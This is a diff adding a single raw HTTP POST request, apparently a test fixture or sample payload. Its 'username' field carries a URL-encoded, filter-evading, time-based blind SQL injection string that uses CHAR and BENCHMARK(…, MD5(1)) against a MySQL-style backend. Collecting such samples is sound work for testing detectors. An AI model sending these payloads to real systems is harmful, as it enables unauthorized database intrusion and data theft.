@@ -1,0 +1,9 @@
+POST /api/data HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+username=%27%250BCHAR%2879%2C82%29%250BBEnChMaRK%28268281%2C%2509MD5%281%29%29--
